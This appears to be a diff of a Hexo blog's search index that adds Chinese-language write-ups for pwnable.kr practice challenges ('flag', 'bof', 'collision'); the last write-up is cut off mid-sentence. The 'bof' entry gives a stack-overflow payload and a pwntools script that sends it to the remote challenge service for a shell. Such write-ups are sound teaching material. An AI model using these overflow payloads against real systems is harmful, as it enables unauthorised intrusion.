@@ -1,40 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>新文章</title>
-    <url>/2021/11/26/%E6%96%B0%E6%96%87%E7%AB%A0/</url>
-    <content><![CDATA[<p>新文章</p>
-]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>分享</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/11/26/hello-world/</url>
-    <content><![CDATA[<span id="more"></span>
-
-
-<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>【pwnable.kr】Toddler‘s Bottle-[fd]</title>
     <url>/2021/12/04/%E3%80%90pwnable.kr%E3%80%91Toddler&#39;s%20Bottle-%5Bfd%5D/</url>
     <content><![CDATA[<span id="more"></span>
@@ -116,6 +82,395 @@
 ]]></content>
       <categories>
         <category>安全</category>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【pwnable.kr】Toddler‘s Bottle-[flag]</title>
+    <url>/2021/12/04/%E3%80%90pwnable.kr%E3%80%91Toddler&#39;s%20Bottle-%5Bflag%5D/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<hr>
+<h1 id="下载题目文件"><a href="#下载题目文件" class="headerlink" title="下载题目文件"></a>下载题目文件</h1><hr>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211120112822068.png" alt="image-20211120112822068"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! <span class="built_in">let</span><span class="string">&#x27;s open it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Download : http://pwnable.kr/bin/flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is reversing task. all you need is binary</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这是逆向任务。你所需要的只是二进制。</p>
+</blockquote>
+<p><strong>下载文件</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;wegt http://pwnable.kr/bin/flag</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<hr>
+<h1 id="二进制分析"><a href="#二进制分析" class="headerlink" title="二进制分析"></a>二进制分析</h1><hr>
+<ul>
+<li>查看文件类型</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;file flag</span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用ida64进行分析</li>
+</ul>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211120113820565.png" alt="image-20211120113820565"></p>
+<p>发现并没有显示有效函数结构。看到二进制中有px 。</p>
+<p>当我们拿到一个pwn文件时，首先应当查壳。在ctf比赛中的pwn大多在Linux下，Linux下没有很强力的壳，一般都是<code>upx格式</code>的壳，所以可以在命令行中用<code>upx -d file</code>来进行脱壳操作。安装方式不同，我这里的命令是<code>./upx.out -d flag</code>。</p>
+<p>可以用 PEID查壳工具检查，另外可用checksec 查看保护机制。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hispark@ubuntu:~/桌面$ ./upx.out -d flag </span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure>
+
+<p>unpack 之后 ida64 分析</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will malloc() and strcpy the flag there. take it.&quot;</span>, argv, envp);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100LL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, flag); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>果然正如题目所说，flag 只是二进制罢了，在源程序中就有了。</p>
+<hr>
+<h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><hr>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/flag.gif" alt="flag"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">aUpxSoundsLikeA db <span class="string">&#x27;UPX...? sounds like a delivery service :)&#x27;</span>,0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>
+
+<p>此外，还可使用gdb调试的方式。</p>
+<hr>
+<h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><hr>
+<p>【下次更新】</p>
+<hr>
+<p>参考:</p>
+<p><a href="https://www.jianshu.com/p/755e52d48a77">https://www.jianshu.com/p/755e52d48a77</a></p>
+<p><a href="https://blog.csdn.net/okawari_richi/article/details/57411796">https://blog.csdn.net/okawari_richi/article/details/57411796</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【pwnable.kr】Toddler‘s Bottle-[bof]</title>
+    <url>/2021/12/04/%E3%80%90pwnable.kr%E3%80%91Toddler&#39;s%20Bottle-%5Bbof%5D/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<hr>
+<h1 id="打开题目审题"><a href="#打开题目审题" class="headerlink" title="打开题目审题"></a>打开题目审题</h1><hr>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211119202026852.png" alt="image-20211119202026852"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that <span class="literal">true</span>?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Nana告诉我缓冲区溢出是最常见的软件漏洞之一。</p>
+</blockquote>
+<h2 id="nc-命令介绍"><a href="#nc-命令介绍" class="headerlink" title="nc 命令介绍"></a>nc 命令介绍</h2><p><a href="https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a> 具体内容该博客讲的很详细</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
+
+<p>简单来说该命令就是和 服务器9000端口交互，命令打开不难发现该端口执行的就是bof。</p>
+<h2 id="获取服务器文件"><a href="#获取服务器文件" class="headerlink" title="获取服务器文件"></a>获取服务器文件</h2><p><strong>第一种方式：</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br></pre></td></tr></table></figure>
+
+<p>题目中已经给出了链接，直接在浏览器中打开右键另存为即可。</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211119202702010.png" alt="image-20211119202702010"></p>
+<p><strong>第二种方式：</strong></p>
+<p>使用 wget 命令</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://pwnable.kr/bin/bof</span><br><span class="line">wget http://pwnable.kr/bin/bof.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211119202912958.png" alt="image-20211119202912958"></p>
+<hr>
+<h1 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h1><hr>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>很好懂，基本就是输入一个overflow字符串  这个字符串要让main调用func时传入的参数<code>0xdeadbeef</code> 和 <code>0xcafebabe</code> 相同,这时我们才能够切换到命令行模式获取flag。</p>
+</blockquote>
+<p>题目已经有提示了，缓冲区溢出，那如何构造payload呢。上ida。</p>
+<p>源码没什么看头，这里已经要开始分析内存了。</p>
+<hr>
+<h1 id="ELF分析构造payload"><a href="#ELF分析构造payload" class="headerlink" title="ELF分析构造payload"></a>ELF分析构造payload</h1><hr>
+<p>看下该文件类型</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D:\Desktop&gt;file bof</span><br><span class="line">bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>32位的ELF文件，用ida打开。</p>
+<p>F5反编译一下可得func：</p>
+<p><strong>IDA pseudocode</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  puts(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == -889275714 )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Nah..&quot;</span>);</span><br><span class="line">  <span class="built_in">return</span> __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看注释可以看到 </p>
+<p>程序调用gets获取字符串s [esp+1Ch] [ebp-2Ch]  和传入的参数 a1 [esp+3Ch] [ebp-Ch] 比较。</p>
+<p><strong>IDA disassemable：</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">.text:0000062C                 public func</span><br><span class="line">.text:0000062C func            proc near               ; CODE XREF: main+10↓p</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C s               = byte ptr -2Ch</span><br><span class="line">.text:0000062C var_C           = dword ptr -0Ch</span><br><span class="line">.text:0000062C arg_0           = dword ptr  8</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C ; __unwind &#123;</span><br><span class="line">.text:0000062C                 push    ebp</span><br><span class="line">.text:0000062D                 mov     ebp, esp</span><br><span class="line">.text:0000062F                 sub     esp, 48h</span><br><span class="line">.text:00000632                 mov     eax, large gs:14h</span><br><span class="line">.text:00000638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:0000063B                 xor     eax, eax</span><br><span class="line">.text:0000063D                 mov     dword ptr [esp], offset s ; <span class="string">&quot;overflow me : &quot;</span></span><br><span class="line">.text:00000644                 call    puts</span><br><span class="line">.text:00000649                 lea     eax, [ebp+s]</span><br><span class="line">.text:0000064C                 mov     [esp], eax      ; s</span><br><span class="line">.text:0000064F                 call    gets</span><br><span class="line">.text:00000654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:0000065B                 jnz     short loc_66B</span><br><span class="line">.text:0000065D                 mov     dword ptr [esp], offset <span class="built_in">command</span> ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:00000664                 call    system</span><br><span class="line">.text:00000669                 jmp     short loc_677</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>很简单，其实就是覆盖掉参数，计算偏移量即可</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cmp     [ebp+arg_0], 0CAFEBABEh</span><br></pre></td></tr></table></figure>
+
+<p>参数key的位置是<code> [ebp+arg_0]</code>   <code>arg_0= dword ptr  8</code>  可知，参数key的位置是 <code> [ebp+8]</code></p>
+<p>然后，char s; // [esp+1Ch] [ebp-2Ch]  可知overflow(即s)的位置就是 <code>[ebp-2Ch]</code></p>
+<p>我们需要输入overflow 覆盖掉 原来的参数即可。覆盖为<code>0CAFEBABEh</code> 。</p>
+<p>构造payload那就是：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">52*<span class="string">&#x27;A&#x27;</span> + <span class="string">&quot;\xbe\xba\xfe\xca&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>A 可以是任意字符。下图可以看到是低地址存放低位，小端模式。我们从 <code>[ebp-2Ch]</code>写到 <code> [ebp+8]</code>。</p>
+<p>从小端写，所以是<code>&quot;\xbe\xba\xfe\xca&quot;</code>  </p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211119212839637.png" alt="image-20211119212839637"></p>
+<p>关于ebp，放张图：</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20210808185235941.png" alt="image-20210808185235941"></p>
+<hr>
+<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><hr>
+<blockquote>
+<p>需要使用pwn模块</p>
+</blockquote>
+<p>这种方式就不需要考虑大小端问题了，函数会解决。</p>
+<p><strong>bof.py</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">r = pwn.remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="built_in">str</span>(pwn.p32(<span class="number">0xcafebabe</span>)))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*52+pwn.p32(0xcafebabe) = <span class="string">&#x27;A&#x27;</span>*0x34+<span class="string">&#x27;\xBE\xBA\xFE\xCA&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行即可。</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/image-20211119220621970.png" alt="image-20211119220621970"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 52504</span><br><span class="line">drwxr-x---  3 root bof      4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 87 root root     4096 Dec 27 23:17 ..</span><br><span class="line">d---------  2 root root     4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-xr-x---  1 root bof      7348 Sep 12  2016 bof</span><br><span class="line">-rw-r--r--  1 root root      308 Oct 23  2016 bof.c</span><br><span class="line">-r--r-----  1 root bof        32 Jun 11  2014 flag</span><br><span class="line">-rw-------  1 root root 53726989 Jun 26 18:23 <span class="built_in">log</span></span><br><span class="line">-rw-r--r--  1 root root        0 Oct 23  2016 log2</span><br><span class="line">-rwx------  1 root root      760 Sep 10  2014 super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>daddy, I just pwned a buFFer :)</p>
+</blockquote>
+<p>获得flag</p>
+<hr>
+<p>参考:</p>
+<p><a href="https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p>
+<p><a href="https://blog.csdn.net/summonlight/article/details/81123785">https://blog.csdn.net/summonlight/article/details/81123785</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【pwnable.kr】Toddler‘s Bottle-[collision]</title>
+    <url>/2021/12/04/%E3%80%90pwnable.kr%E3%80%91Toddler&#39;s%20Bottle-%5Bcollision%5D/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<hr>
+<h1 id="打开题目审题"><a href="#打开题目审题" class="headerlink" title="打开题目审题"></a>打开题目审题</h1><hr>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f81c8e965b7b294bc7b66d730e4818ec.png" alt="image-20211107214527901"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 <span class="built_in">hash</span> collision today.</span><br><span class="line">I wanna <span class="keyword">do</span> something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>题目中提到MD5哈希碰撞，可以基本确定方向</p>
+</blockquote>
+<p>输入命令回车，输入密码：guest 即可登录服务器。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/53cb4d6aa3735a4c6bf27f8cc972e0af.png" alt="image-20211107214836342"></p>
+<hr>
+<h1 id="找到突破口"><a href="#找到突破口" class="headerlink" title="找到突破口"></a>找到突破口</h1><hr>
+<blockquote>
+<p>照例先 <code>ls -la</code></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-x---   5 root    col     4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 115 root    root    4096 Dec 22  2020 ..</span><br><span class="line">d---------   2 root    root    4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r--   1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br><span class="line">dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi</span><br><span class="line">drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache</span><br></pre></td></tr></table></figure>
+
+<p>发现flag文件，尝试查看（肯定看不了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fd@pwnable:~$ cat flag</span><br><span class="line">cat: flag: Permission denied</span><br><span class="line">fd@pwnable:~$</span><br></pre></td></tr></table></figure>
+
+<p>果然不能看。看下别的，文件flag肯定是最后的答案，所以需要看看其他文件找寻突破口。</p>
+<p>还有一个c语言源文件<code>col.c</code>和可执行文件<code>col</code>。</p>
+<p>那没什么说的，看看col.c。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>找到重点  system(“/bin/cat flag”);</p>
+</blockquote>
+<p>看到源码大概已经明白了，我们没有查看文件的权限，但是fd有，所以只要分析如何让代码执行<code>system(&quot;/bin/cat flag&quot;);</code>即可。</p>
+<hr>
+<h1 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h1><hr>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    	<span class="comment">// 要有参数 </span></span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">// 第一个参数长度必须是20字节</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 对argv[1]进行check_password 结果与hashcode 相等</span></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>单独分析<code>unsigned long check_password(const char* p)</code></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>res 就是将 参数每四个字节相加后的结果，联系main函数，可知我们输入参数每四个字节相加必须hashcode = <code>0x21DD09EC</code>  </p>
+<hr>
+<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><hr>
+<p>其实就是计算五个数，五个数相加等于 0x21DD09EC  算一下这五个数。 设为 a、a、a、a、a + b</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/077b057dae3d1b7bdb40c3c08b0691e3.png" alt="image-20211107220856130"></p>
+<p>继续计算器计算：0x06C5CEC8  * 5 = 0x21DD09E8  与原数相差 4 </p>
+<p>五个数就计算出来了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x06C5CEC8、0x06C5CEC8、0x06C5CEC8、0x06C5CEC8、0x06C5CECC</span><br></pre></td></tr></table></figure>
+
+<p>但是我们如何保证我们输入的数正好以我们想要的形式存在呢。直接作为参数输入的话。</p>
